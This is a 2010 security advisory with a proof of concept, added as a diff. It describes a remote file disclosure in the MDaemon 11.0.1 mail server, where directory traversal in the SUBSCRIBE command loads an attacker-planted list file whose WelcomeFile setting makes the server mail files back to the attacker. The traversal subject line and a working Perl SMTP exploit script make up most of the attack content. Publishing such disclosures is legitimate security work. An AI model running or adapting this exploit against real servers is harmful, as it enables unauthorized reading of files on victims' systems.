@@ -1,0 +1,119 @@
+MDaemon Mailer Daemon Version 11.0.1 (LATEST) Remote File Disclosure
+Bug Found & Exploited by Kingcope
+May 2010
+
+The latest version at the time of this advisory is vulnerble to the attack.
+It seems all files which the SYSTEM account can read can be accessed remotely,
+even accessing files on SMB shares located in the local network might
+be possible.
+
+The caveat is that only human readable files can be read.
+This bug is complex so let's break the attack down into it's different pieces.
+
+Mailing list support in MDaemon
+---
+MDaemon support mailing list. When a mailing list is configured, people can
+subscribe and use the mailing list commands which are sent to
+MDaemon@<domainhere>.
+The MDaemon Software stores configurations for mailing lists inside a
+file with the grp extension
+which is located in <MDaemonDir>(normally C:\MDaemon)\App so for
+example in C:\MDaemon\App.
+A mailing list group file can look like the following (only a snippet
+of the file):
+
+---snip---
+# Mailing List file
+#
+; ListName = test@company.mail
+; Private = N
+; HideFromAddressBook = N
+; AllowExpn = Y
+; ListNameInSubject = Y
+
+...
+---snip---
+
+
+grp file
+--
+Inside the grp file there is a setting for a welcome message which is
+sent when a user subscribes to
+a mailing list.
+The field is named "WelcomeFile", for example this setting can be:
+; WelcomeFile = C:\autoexec.bat
+
+
+Directory traversal in SUBSCRIBE (and other commands, SUBSCRIBE is the
+important for the attack)
+--
+When subscribing to a mailing list the user sends an E-Mail with a subject like:
+SUBSCRIBE test-mailinglist@<domainhere>
+
+In this case a grp file named test-mailinglist@domain.grp will be
+searched for in C:\MDaemon\App\.
+An attacker can now supply dot dot slashes here to point to a
+different file as intended, for example:
+
+SUBSCRIBE VVV@"../../../../../../../../../../../../../../../../../users/kcope/openshare/foobar
+
+In this case the Mailer Daemon will look for the grp file in the
+location C:\Users\Kcope\OpenShare\foobar.grp.
+If the file exists MDaemon will use this file and send back a
+confirmation E-Mail because of a mailing list subscription.
+The attack does not depend on a mailing list being configured but on a
+file which the user controls under a C: folder (which
+he for example uploaded through SMB or FTP). So this is the only
+migitation for the attack. I did not find a way to
+discard the grp file extension added to the requested file, so it's
+not possible to reuse sent mails by the attacker
+for example.
+
+
+Welcome message file and final attack
+--
+As seen before the grp file supports a welcome message file setting.
+When the user responds to the malicious
+subscription request sent by him (it's important to change the domain
+name at this point to the correct one, because
+MDaemon gets confused by the ../ domainname seen above when sending
+the confirmation mail) he will gracefully receive
+the requested file which was set in grp file back as an email
+contained in a welcome E-Mail by MDaemon.
+
+
+Exploit PoC
+--
+
+The following exploit will force the welcome file set in
+c:/users/kcope/openshare/foobar.grp to be sent to the attacker
+after confirming the subscription request.
+
+---snip---
+use IO::Socket::INET;
+use MIME::Base64;
+
+$|=1;
+
+$sock = IO::Socket::INET->new(PeerAddr => 'localhost',
+                             PeerPort => '25',
+                             Proto    => 'tcp');
+
+print $sock "EHLO you\r\n";
+print $sock "MAIL FROM: <niko>\r\n";
+print $sock "RCPT TO: <MDaemon\@company.mail>\r\n";
+print $sock "DATA\r\n";
+print $sock "Date: 23 Oct 81 11:22:33\r\n";
+print $sock "From: <niko>\r\n";
+print $sock "To: <MDaemon\@company.mail>\r\n";
+print $sock "Subject: SUBSCRIBE
+VVV\@\"../../../../../../../../../../../../../../../../../users/kcope/openshare/foobar\r\n";
+print $sock "\r\n\r\ntest\r\n.\r\nQUIT\r\n";
+print ".";
+
+while(<$sock>) {
+       print;
+}
+---snip---
+
+Kingcope
